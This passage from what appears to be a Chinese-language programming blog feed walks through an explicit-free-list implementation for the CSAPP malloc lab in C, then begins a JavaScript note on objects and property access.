pointer:%p  size:%d \n&quot;</span>, bp, size);</span><br><span class="line">  <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>让我们来测试一下，可以看到我们的分数成功来到了64分！</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240626222745331.png" alt="image-20240626222745331"></p><h3 id="0x3-显式空闲列表"><a href="#0x3-显式空闲列表" class="headerlink" title="0x3 显式空闲列表"></a>0x3 显式空闲列表</h3><p>接下来进行我们的改进！在<code>空闲块</code>内添加前驱后继指针，当需要空闲块时，直接通过指针直接访问下一节点，而不是需要先获取头部信息计算偏移。这种方法可以加快分配速度，但是在释放块时需要线性时间来搜索前驱。那么这样到底可以提升多少访问速度呢，我们使用后进先出的LIFO顺序维护链表。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240626225807142.png" alt="image-20240626225807142"></p><p>利用宏定义来快速获取和放置前驱和后继指针， 同时定义插入和删除函数，简化对链表的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* 获取指针 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_PRED(bp) (*(char **)(bp))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GET_SUCC(bp) (*(char **)((char *)(bp) + WSIZE))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 放置指针 */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_PRED(bp, pred) (*(char **)(bp) = (pred))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PUT_SUCC(bp, succ) (*(char **)((char *)(bp) + WSIZE) = (succ))</span></span><br><span class="line"><span class="type">static</span> <span class="type">char</span> *free_listp = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">insert_free_block</span><span class="params">(<span class="type">char</span> *bp)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (free_listp != <span class="literal">NULL</span>) &#123;</span><br><span class="line">        PUT_PRED(bp, <span class="literal">NULL</span>);</span><br><span class="line">        PUT_SUCC(bp, free_listp);</span><br><span class="line">        PUT_PRED(free_listp, bp);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        PUT_PRED(bp, <span class="literal">NULL</span>);</span><br><span class="line">        PUT_SUCC(bp, <span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    free_listp = bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">remove_free_block</span><span class="params">(<span class="type">char</span> *bp)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *pred = GET_PRED(bp);</span><br><span class="line">  <span class="type">char</span> *succ = GET_SUCC(bp);</span><br><span class="line">  <span class="comment">//当前块不为列表头部</span></span><br><span class="line">  <span class="keyword">if</span> (pred != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    PUT_SUCC(pred, succ);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    free_listp = succ;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//判断是否有后继，将前驱添加到后继中</span></span><br><span class="line">  <span class="keyword">if</span> (succ != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    PUT_PRED(succ, pred);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>重写<code>mm_check_function()</code>检测空闲链表。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span>  <span class="type">void</span> <span class="title function_">mm_check_function</span><span class="params">()</span> &#123;</span><br><span class="line">  FILE *file;</span><br><span class="line">  file = fopen(<span class="string">&quot;log.log&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *p = free_listp;</span><br><span class="line">  <span class="built_in">fprintf</span>(file, <span class="string">&quot;\n\n====================空闲链表======================\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="type">size_t</span> alloc = GET_ALLOC(HDRP(p));</span><br><span class="line">    <span class="built_in">fprintf</span>(file, <span class="string">&quot;pointer：%p  pre:%p   succ:%p  size:%d    alloc:%d\n&quot;</span>, p,GET_PRED(p), GET_SUCC(p), size, alloc);</span><br><span class="line">    p = GET_SUCC(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">fprintf</span>(file, <span class="string">&quot;\n====================空闲链表======================\n\n\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fclose(file) != <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现的三大函数只需在free时将空闲块加入空闲链表即可。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_init - initialize the malloc package.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">mm_init</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> ((heap_listp = mem_sbrk(<span class="number">4</span> * WSIZE)) == (<span class="type">void</span> *)<span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  PUT(heap_listp, <span class="number">0</span>);</span><br><span class="line">  PUT(heap_listp + (<span class="number">1</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">  PUT(heap_listp + (<span class="number">2</span> * WSIZE), PACK(DSIZE, <span class="number">1</span>));</span><br><span class="line">  PUT(heap_listp + (<span class="number">3</span> * WSIZE), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">  heap_listp += (<span class="number">4</span> * WSIZE);</span><br><span class="line">     free_listp = <span class="literal">NULL</span>;  <span class="comment">// 初始化 free_listp</span></span><br><span class="line">  <span class="keyword">if</span> (extend_heap(CHUNKSIZE / WSIZE) == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_malloc - Allocate a block by incrementing the brk pointer.</span></span><br><span class="line"><span class="comment"> *     Always allocate a block whose size is a multiple of the alignment.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_malloc</span><span class="params">(<span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">  log_message(<span class="string">&quot;malloc %d\n&quot;</span>, size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> asize = ALIGN(size + SIZE_T_SIZE); <span class="comment">//加入头部尾部并对齐</span></span><br><span class="line">  <span class="type">size_t</span> extendsize;</span><br><span class="line">  <span class="type">char</span> *bp;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((bp = find_fit(asize)) != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    place(bp, asize);</span><br><span class="line">    log_message(<span class="string">&quot;malloc:success! pointer:%p   size:%d     alloc:%d  \n\n&quot;</span>, bp,</span><br><span class="line">                GET_SIZE(HDRP(bp)), GET_ALLOC(HDRP(bp)));</span><br><span class="line">    mm_check();</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    extendsize = MAX(CHUNKSIZE, asize);</span><br><span class="line">    log_message(<span class="string">&quot;We need %d!!!\n&quot;</span>, extendsize);</span><br><span class="line">    <span class="keyword">if</span> ((bp = extend_heap(extendsize / WSIZE)) == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">      place(bp, asize);</span><br><span class="line">      log_message(<span class="string">&quot;malloc:success! pointer:%p   size:%d     alloc:%d  \n\n&quot;</span>, bp,</span><br><span class="line">                  GET_SIZE(HDRP(bp)), GET_ALLOC(HDRP(bp)));</span><br><span class="line">      mm_check();</span><br><span class="line">      <span class="keyword">return</span> bp;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_free - Freeing a block does nothing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">mm_free</span><span class="params">(<span class="type">void</span> *ptr)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">  PUT(HDRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">  PUT(FTRP(ptr), PACK(size, <span class="number">0</span>));</span><br><span class="line">  insert_free_block(ptr);</span><br><span class="line">  coalesce(ptr);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * mm_realloc - Implemented simply in terms of mm_malloc and mm_free</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">void</span> *<span class="title function_">mm_realloc</span><span class="params">(<span class="type">void</span> *ptr, <span class="type">size_t</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line">  <span class="type">size_t</span> oldsize;</span><br><span class="line">  <span class="type">void</span> *newptr;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size == <span class="number">0</span>) &#123;</span><br><span class="line">    mm_free(ptr);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (ptr == <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> mm_malloc(size);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  newptr = mm_malloc(size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!newptr) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  oldsize = GET_SIZE(HDRP(ptr));</span><br><span class="line">  <span class="keyword">if</span> (size &lt; oldsize)</span><br><span class="line">    oldsize = size;</span><br><span class="line">  <span class="built_in">memcpy</span>(newptr, ptr, oldsize);</span><br><span class="line"></span><br><span class="line">  mm_free(ptr);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> newptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>注意区分已分配的块和未分配的块，</p><p><strong>只有未分配的块才需要添加前驱和后继指针，已分配的块需要及时去除前驱和后继指针。</strong></p><p>coalesce函数不同情况的空闲块都需要先删除指针后重新分配。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span>  <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">coalesce</span><span class="params">(<span class="type">void</span> *bp)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> prev_alloc = GET_ALLOC(HDRP(PREV_BLKP(bp)));</span><br><span class="line">  <span class="type">size_t</span> next_alloc = GET_ALLOC(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">  <span class="type">size_t</span> size = GET_SIZE(HDRP(bp));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (prev_alloc &amp;&amp; next_alloc) &#123; <span class="comment">/* case 1 */</span></span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 1   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">    <span class="keyword">return</span> bp;</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (prev_alloc &amp;&amp; !next_alloc) &#123; <span class="comment">/* case 2 */</span></span><br><span class="line">    size += GET_SIZE(HDRP(NEXT_BLKP(bp)));</span><br><span class="line">    remove_free_block(bp);</span><br><span class="line">    remove_free_block(NEXT_BLKP(bp));</span><br><span class="line">    PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    insert_free_block(bp);</span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 2   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; next_alloc) &#123; <span class="comment">/* case 3 */</span></span><br><span class="line">    remove_free_block(bp);</span><br><span class="line">    remove_free_block(PREV_BLKP(bp));</span><br><span class="line">    size += GET_SIZE(HDRP(PREV_BLKP(bp)));</span><br><span class="line">    PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    insert_free_block(PREV_BLKP(bp));</span><br><span class="line">    bp = PREV_BLKP(bp);</span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 3   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!prev_alloc &amp;&amp; !next_alloc) &#123; <span class="comment">/* case 4 */</span></span><br><span class="line">    remove_free_block(PREV_BLKP(bp));</span><br><span class="line">    remove_free_block(bp);</span><br><span class="line">    remove_free_block(NEXT_BLKP(bp));</span><br><span class="line">    size += GET_SIZE(HDRP(PREV_BLKP(bp))) + GET_SIZE(FTRP(NEXT_BLKP(bp)));</span><br><span class="line">    PUT(HDRP(PREV_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(NEXT_BLKP(bp)), PACK(size, <span class="number">0</span>));</span><br><span class="line">    bp = PREV_BLKP(bp);</span><br><span class="line">    insert_free_block(bp);</span><br><span class="line">    log_message(<span class="string">&quot;coalesce: case 4   pointer:%p\n&quot;</span>, bp);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> bp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">char</span> *<span class="title function_">find_fit</span><span class="params">(<span class="type">size_t</span> asize)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *p = free_listp;</span><br><span class="line">  <span class="keyword">while</span> (p != <span class="literal">NULL</span>) &#123;</span><br><span class="line">    <span class="type">size_t</span> size = GET_SIZE(HDRP(p));</span><br><span class="line">    <span class="type">size_t</span> alloc = GET_ALLOC(HDRP(p));</span><br><span class="line">    <span class="keyword">if</span> (!alloc &amp;&amp; size &gt;= asize) &#123;</span><br><span class="line">      log_message(<span class="string">&quot;fit_block   poniter:%p size:%d   alloc:%d\n&quot;</span>, p, size, alloc);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">    &#125;</span><br><span class="line">    p = GET_SUCC(p);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> <span class="title function_">place</span><span class="params">(<span class="type">char</span> *ptr, <span class="type">size_t</span> asize)</span> &#123;</span><br><span class="line">  <span class="type">size_t</span> size = GET_SIZE(HDRP(ptr));</span><br><span class="line">  <span class="keyword">if</span> ((size - asize) &gt;= (<span class="number">2</span> * DSIZE)) &#123;</span><br><span class="line">    PUT(HDRP(ptr), PACK(asize, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(asize, <span class="number">1</span>));</span><br><span class="line">    remove_free_block(ptr);   <span class="comment">// 将已分配的块从空闲块列表中移除</span></span><br><span class="line">    <span class="type">char</span> *next_ptr = NEXT_BLKP(ptr);</span><br><span class="line">    PUT(HDRP(next_ptr), PACK(size - asize, <span class="number">0</span>));</span><br><span class="line">    PUT(FTRP(next_ptr), PACK(size - asize, <span class="number">0</span>));   </span><br><span class="line">    insert_free_block(next_ptr);    <span class="comment">// 将剩余的部分作为空闲块插入列表</span></span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    PUT(HDRP(ptr), PACK(size, <span class="number">1</span>));</span><br><span class="line">    PUT(FTRP(ptr), PACK(size, <span class="number">1</span>));</span><br><span class="line">    remove_free_block(ptr);   <span class="comment">// 将已分配的块从空闲块列表中移除</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">void</span> *<span class="title function_">extend_heap</span><span class="params">(<span class="type">size_t</span> words)</span> &#123;</span><br><span class="line">  <span class="type">char</span> *bp;</span><br><span class="line">  <span class="type">size_t</span> size;</span><br><span class="line">  size = (words % <span class="number">2</span>) ? ((words + <span class="number">1</span>) * WSIZE) : (words * WSIZE); <span class="comment">//写反了</span></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">long</span>)(bp = mem_sbrk(size)) == <span class="number">-1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  PUT(HDRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">  PUT(FTRP(bp), PACK(size, <span class="number">0</span>));</span><br><span class="line">  PUT(HDRP(NEXT_BLKP(bp)), PACK(<span class="number">0</span>, <span class="number">1</span>));</span><br><span class="line">  log_message(<span class="string">&quot;extend_heap:   pointer:%p  size:%d \n&quot;</span>, bp, size);</span><br><span class="line">  insert_free_block(bp);</span><br><span class="line">  mm_check();</span><br><span class="line">  <span class="keyword">return</span> coalesce(bp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到虽然内存利用率有些许下降，但是我们分配速度得到了快速的提升！！！那么，82也算是优秀了吧(👉ﾟヮﾟ)👉。</p><p><img src="https://randolfluo.oss-cn-guangzhou.aliyuncs.com/img/image-20240627211854640.png" alt="image-20240627211854640"></p><h3 id="0x4分离空闲列表"><a href="#0x4分离空闲列表" class="headerlink" title="0x4分离空闲列表"></a>0x4分离空闲列表</h3><p>将不同大小的空闲列表分割，将分配时查找空闲块的时间变为匹配不同大小链表的时间，当空闲块很多时，可以显著提高分配器的效率。</p><p>这里先标记为TODO，希望以后有时间会回来做。</p>]]></content>
      
      
      <categories>
          
          <category> csapp </category>
          
          <category> lab </category>
          
      </categories>
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> lab </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaScript学习记录0x2</title>
      <link href="/2024/05/24/js/javascript%20%E5%AF%B9%E8%B1%A1/"/>
      <url>/2024/05/24/js/javascript%20%E5%AF%B9%E8%B1%A1/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h4 id="4-1-对象"><a href="#4-1-对象" class="headerlink" title="4.1 对象"></a>4.1 对象</h4><p>构造对象的方法</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = <span class="keyword">new</span> <span class="title class_">Object</span>(); <span class="comment">// “构造函数” 的语法</span></span><br><span class="line"><span class="keyword">let</span> user = &#123;&#125;;  <span class="comment">// “字面量” 的语法</span></span><br></pre></td></tr></table></figure><h5 id="文本和属性"><a href="#文本和属性" class="headerlink" title="文本和属性"></a>文本和属性</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> user = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Nian lin&quot;</span>: <span class="number">20</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">alert</span>(user.<span class="property">name</span>);</span><br><span class="line"></span><br><span class="line">user.<span class="property">country</span> = <span class="string">&quot;China&quot;</span>  <span class="comment">// 添加属性</span></span><br><span class="line"><span class="title function_">alert</span>(user.<span class="property">country</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> user.<span class="property">country</span>;        <span class="comment">// 删除属性</span></span><br><span class="line"><span class="title function_">alert</span>(user.<span class="property">country</span>);      <span class="comment">//undefined</span></span><br><span class="line"></span><br><span class="line">user[<span class="string">&quot;Nian lin&quot;</span>] = <span class="number">18</span>;   <span class="comment">//有空格或者数字开头的属性，需要用中括号</span></span><br><span class="line">                        <span class="comment">//这里的Nian lin可以由程序运行时计算得出</span></span><br></pre></td></tr></table></figure><h5 id="方括号"><a href="#方括号" class="headerlink" title="方括号"></a>方括号</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//因此我们实现返回用户需要的属性值</span></span><br><span class="line"><span class="keyword">let</span> user1 = &#123;</span><br><span class="line">    <span class="attr">name</span>: <span class="string">&quot;Randolfluo&quot;</span>,</span><br><span class="line">    <span class="attr">age</span>: <span class="number">20</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> key = <span class="title function_">prompt</span>(<span class="string">&quot;你想知道什么？&quot;</span>, <span class="string">&quot;name&quot;</span>);</span><br><span class="line"><span class="title function_">alert</span>(user1[key]);</span><br><span class="line"><span class="comment">//当然，.点符号不能以类似的方式使用</span></span><br></pre></td></tr></table></figure><h5 id="计算属性"><a href="#计算属性" class="headerlink" title="计算属性"></a>计算属性</h5><p>我们还可以在运行中输入属性名</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> attr = <span class="title function_">prompt</span>(<span class="string">&quot;Please input a attribute&quot;</span>,<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> human = &#123;</span><br><span class="line">    attr : <span class="string">&quot;Defalut&quot;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> value = <span class="title function_">prompt</span>(<span class="string">&quot;Please input a value&quot;</span>,<span class="string">&quot;Randolfluo&quot;</span>);</span><br><span class="line"></span><br><span class="line">human[attr]=<span class="string">&quot;value: &quot;</span> + value;</span><br><span class="line"><span class="title function_">alert</span>(human[attr]);     <span class="comment">//value: Randolfluo</span></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(attr);      <span class="comment">//name</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="属性名简写"><a href="#属性名简写" class="headerlink" 